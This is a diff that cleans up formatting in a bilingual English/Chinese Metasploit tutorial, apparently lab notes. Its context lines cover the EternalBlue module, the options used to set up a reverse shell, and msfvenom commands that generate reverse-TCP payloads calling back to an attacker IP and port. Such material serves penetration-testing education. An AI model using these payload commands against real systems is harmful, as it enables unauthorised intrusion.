@@ -108,7 +108,7 @@ msf6 > ls
 google  microsoft  sogoupinyin  uTools
 ```
 
-It will support most <u>Linux</u> commands, including `<font style="color:rgb(143,149,158);background-color:rgb(187,191,196);">clear</font>` (to clear the terminal screen), but will not allow you to use some features of a regular command line (e.g. does not support output redirection), as seen below. 它将支持大多数 Linux 命令，包括 `<font style="color:rgb(143,149,158);background-color:rgb(187,191,196);">clear</font>` （用于清除终端屏幕），但不会允许您使用常规命令行的一些功能（例如，不支持输出重定向），如下所示。
+It will support most <u>Linux</u> commands, including `clear` (to clear the terminal screen), but will not allow you to use some features of a regular command line (e.g. does not support output redirection), as seen below. 它将支持大多数 Linux 命令，包括 `clear` （用于清除终端屏幕），但不会允许您使用常规命令行的一些功能（例如，不支持输出重定向），如下所示。
 
 ### 使用漏洞
 使用
@@ -155,7 +155,7 @@ View the full module info with the info, or info -d command.
 
 这样的话我们就进入了一个关于漏洞的上下文环境
 
-使用`<font style="background-color:rgb(187,191,196);">info</font>`的话可以清楚的看一下具体信息
+使用`info`的话可以清楚的看一下具体信息
 
 或者info exploit/windows/smb/ms17_010_eternalblue
 
@@ -303,12 +303,12 @@ set rport 7777
 
 ![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1753631142006-e4099d9c-d7d7-4581-8da6-4f86735e101c.png)
 
-+ **RHOSTS:** “Remote host”, the IP address of the target system. A single IP address or a network range can be set. This will support the CIDR (Classless Inter-Domain Routing) notation (/24, /16, etc.) or a network range (10.10.10.x – 10.10.10.y). You can also use a file where targets are listed, one target per line using file:/path/of/the/target_file.txt, as you can see below. 
-+ **RPORT:** “Remote port”, the port on the target system the vulnerable application is running on. 
-+ **PAYLOAD: **The payload you will use with the exploit. 
-+ **LHOST:** “Localhost”, the attacking machine (your AttackBox or Kali <u>Linux</u>) IP address. 
-+ **LPORT:** “Local port”, the port you will use for the reverse shell to connect back to. This is a port on your attacking machine, and you can set it to any port not used by any other application. 
-+ **SESSION:** Each connection established to the target system using <u>Metasploit</u> will have a session ID. You will use this with post-exploitation modules that will connect to the target system using an existing connection. 
++ **RHOSTS:** “Remote host”, the IP address of the target system. A single IP address or a network range can be set. This will support the CIDR (Classless Inter-Domain Routing) notation (/24, /16, etc.) or a network range (10.10.10.x – 10.10.10.y). You can also use a file where targets are listed, one target per line using file:/path/of/the/target_file.txt, as you can see below.
++ **RPORT:** “Remote port”, the port on the target system the vulnerable application is running on.
++ **PAYLOAD: **The payload you will use with the exploit.
++ **LHOST:** “Localhost”, the attacking machine (your AttackBox or Kali <u>Linux</u>) IP address.
++ **LPORT:** “Local port”, the port you will use for the reverse shell to connect back to. This is a port on your attacking machine, and you can set it to any port not used by any other application.
++ **SESSION:** Each connection established to the target system using <u>Metasploit</u> will have a session ID. You will use this with post-exploitation modules that will connect to the target system using an existing connection.
 
 ## 实际用例
 ### msf-扫描
@@ -525,7 +525,7 @@ msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address>LPORT=<Your Port to
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.9 LPORT=7777 -f elf > shell.elf
 ```
 
-会生成`<font style="background-color:rgb(187,191,196);">elf</font>`w
+会生成`elf`w
 
 #### 使用🐎
 ```plain
